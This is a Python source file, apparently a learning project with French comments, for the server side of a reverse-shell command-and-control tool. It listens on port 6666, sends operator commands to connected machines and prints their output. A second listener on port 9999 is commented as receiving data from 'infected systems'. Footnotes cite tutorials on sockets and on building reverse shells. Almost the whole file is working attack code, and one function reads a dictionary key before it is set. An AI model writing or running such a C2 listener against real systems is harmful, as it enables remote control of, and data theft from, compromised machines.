#!/usr/bin/env python
#coding=utf-8
__author__ = "Karl Boulais"

import socket
import threading
import os
import platform
import json

class Server():
    def __init__(self):
        pass

    @staticmethod
    def clrscr():
            if platform.system() == "Linux":
                os.system("clear")
            elif platform.system() == "Windows":
                os.system("cls")

    def _sending(self, c, data):
        return c.send(bytes(json.dumps(data), "UTF-8"))
         
    
    def _receiving(self, c):
        data = ""
        while True:
            try:
                data += c.recv(1024).decode("UTF-8").strip()
                return json.loads(data)
            except ValueError:
                continue

    def _systemData(self, c):
        data = {}
        while True:
            if data["message"] == "exit":
                c.close()
                break
            else:
                # TODO: Change print for DAO 
                data = self._receiving(c)
                print(data["message"])

    def _ReverseShell(self, c):

        quitting = False

        # Reçoit le premier message et initialise data["cwd"]
        data = self._receiving(c)
        while not quitting:

            data["command"] = input(f"{data['cwd']} $> ")
            if not data["command"].strip():
                continue
            elif data["command"].lower() == "cls" or data["command"].lower() == "clear":
                self.clrscr()
                continue
            else:
                # c.send(self.encode(data))
                self._sending(c, data)
                data = self._receiving(c)
            
            if data["command"].lower() == "exit":
                quitting = True
                c.close()
                continue
        
            print(data["output"])

    def _serverReverseShell(self):
        # Démarre le service pour recevoir les connexions ReverseShell
        c = None
        addr = None

        s = socket.socket()

        host = "0.0.0.0"
        port = 6666

        s.bind((host, port))
        s.listen(5)

        while True:
            try:
                c, addr = s.accept()
                print('Got connection from', addr)

                # On crée un thread receiving data
                connection_handler = threading.Thread(
                    target=self._ReverseShell,
                    args=(c,)
                )
                connection_handler.start()
                print("\n Nombre de Thread", threading.active_count())
            except socket.timeout:
                continue
    

    def _serverData(self):
        # Démarre le service pour recevoir les données des systèmes infectés

        c = None
        addr = None

        s = socket.socket()
        host = "0.0.0.0"
        port = 9999
        s.bind((host, port))
        s.listen(5)

        while True:
            c, addr = s.accept()
            print('Got connection from', addr)
            
            # On crée un thread receiving data
            connection_handler = threading.Thread(
                target=self._systemData,
                args=(c,)
            )
            connection_handler.start()
            print("\n Nombre de Thread", threading.active_count())

    def main(self):
        # Démarre deux threads pour recevoir les connexions ReverseShell et d'envoi de données
        self._serverReverseShell()

    


if __name__ == "__main__":
   Server().main()















'''
.. rubric:: Notes de bas de page

.. [1]  https://www.tutorialspoint.com/python_network_programming/python_sockets_programming.htm 
        Principe de base d'une connexion TCP avec le module socket
.. [2]  https://gist.github.com/Integralist/3f004c3594bbf8431c15ed6db15809ae
        Utilisation de thread pour prendre en charge plusieurs connexions client à la fois
.. [3]  https://www.thepythoncode.com/article/create-reverse-shell-python
        Création d'un reverse shell

'''